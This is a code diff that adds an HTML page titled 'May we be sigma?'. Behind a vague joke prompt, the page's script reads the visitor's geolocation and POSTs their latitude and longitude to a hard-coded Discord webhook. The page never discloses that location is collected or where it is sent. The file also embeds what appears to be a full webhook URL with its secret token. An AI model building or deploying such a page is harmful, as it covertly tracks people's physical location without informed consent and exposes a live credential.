@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>May we be sigma?</title>
+</head>
+<body>
+
+<script>
+// Function to send data to Discord webhook
+function sendDataToDiscord(location) {
+    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+    var webhookURL = 'https://discord.com/api/webhooks/1218354893195317279/1FaezMpBarPVujIqm8sWQqKIrSnzkLsXtV-iz2dx6_AqZsiJ_MSsLaYI5SrsrgZRlmql';
+    
+    // Data to be sent
+    var data = {
+        content: 'May we be sigma?',
+        location: location
+    };
+    
+    // Send data to Discord webhook
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Data sent successfully to Discord!');
+        } else {
+            alert('Failed to send data to Discord.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Failed to send data to Discord.');
+    });
+}
+
+// Function to ask for location and send data to Discord
+function askForLocationAndSendData() {
+    // Ask for location permission
+    navigator.geolocation.getCurrentPosition(function(position) {
+        var location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+        };
+        sendDataToDiscord(location);
+    }, function(error) {
+        console.error('Error getting location:', error);
+        alert('Failed to get location.');
+    });
+}
+
+// Prompt the user with a confirmation alert
+var confirmation = confirm('May we be sigma?');
+if (confirmation) {
+    askForLocationAndSendData();
+} else {
+    alert('You declined.');
+}
+</script>
+
+</body>
+</html>
